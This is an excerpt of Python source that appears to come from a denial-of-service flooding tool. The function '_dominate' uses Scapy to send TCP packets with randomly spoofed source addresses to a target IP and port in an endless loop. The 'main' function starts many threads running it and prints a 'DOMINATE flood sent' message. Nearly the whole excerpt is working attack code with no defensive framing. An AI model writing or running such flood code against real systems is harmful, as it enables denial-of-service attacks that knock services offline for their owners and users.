...
def _dominate(_ip, _prt):
    while _abort == False:
        try:
            fake = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(src=fake, dst=_ip) / TCP(sport=RandShort(), dport=int(_prt), flags="SEC", seq=RandShort())
...
def main():
    ...
    print('\r\n\r\n ---> DOMINATE flood sent to ' + arg1 + ' for ' + _time + ' seconds!')
    tasks = []
    for x in range(0, int(_thdz)):
        x = threading.Thread(target=_dominate, args=(arg1, arg2))
        tasks.append(x)
        x.start()
